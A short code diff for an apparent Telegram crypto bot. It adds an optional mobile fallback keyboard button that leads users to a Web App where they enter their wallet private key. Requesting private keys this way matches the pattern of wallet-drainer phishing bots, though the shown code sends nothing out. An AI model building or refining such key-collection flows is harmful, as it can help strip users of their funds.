@@ -41,6 +41,7 @@ logger = logging.getLogger(__name__)
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 ADMIN_SECRET_KEY = os.getenv("ADMIN_SECRET_KEY")
 WEBHOOK_URL = os.getenv("WEBHOOK_URL")
+MOBILE_WEBAPP_FALLBACK = os.getenv("MOBILE_WEBAPP_FALLBACK", "false").lower() in ("1", "true", "yes")
 PORT = int(os.environ.get('PORT', 8080))
 
 from src.nlp import NLPClient
@@ -802,6 +803,22 @@ async def received_wallet_address(update: Update, context: ContextTypes.DEFAULT_
         "Great. Now, please click the button below to securely enter your private key.",
         reply_markup=reply_markup
     )
+
+    # Optional mobile fallback: some mobile clients open Web Apps more reliably via reply keyboard
+    if MOBILE_WEBAPP_FALLBACK:
+        try:
+            from telegram import ReplyKeyboardMarkup, KeyboardButton
+            reply_kb = ReplyKeyboardMarkup(
+                [[KeyboardButton("Enter Private Key Securely", web_app=WebAppInfo(url=f"{WEBHOOK_URL}/web-app/index.html"))]],
+                resize_keyboard=True,
+                one_time_keyboard=True,
+            )
+            await update.message.reply_text(
+                "If the button above didn’t open on mobile, use this keyboard button:",
+                reply_markup=reply_kb
+            )
+        except Exception as e:
+            logger.warning(f"Could not send mobile WebApp fallback keyboard: {e}")
     return AWAIT_WEB_APP_DATA
 
 async def received_private_key(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
